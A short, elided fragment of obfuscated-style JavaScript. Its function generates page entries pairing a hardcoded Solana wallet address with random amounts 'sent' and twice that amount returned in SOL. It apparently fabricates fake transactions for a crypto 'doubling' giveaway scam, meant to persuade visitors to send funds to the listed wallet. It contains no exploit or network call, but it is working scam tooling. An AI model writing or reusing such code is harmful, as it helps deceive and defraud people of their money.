...
function genDiv() {
    divCounter++;
    let valet = "BbAArTvEEUh7cYjFKagJYYRwxvSWvprWLTqVHtxR3tbx";
    var _0xe480x9 =
    ...
    let _0xe480xd = '1' + randomString(6) + '...';
    let _0xe480xe = '';
    let _0xe480xf = valet.substring(0, 6);
    let valueSend = randomIntegerBTC(40, 5000);
    let _0xe480x10 = valueSend + ' SOL';
    ...
    let _0xe480x18 = (valueSend * 2) + ' SOL';
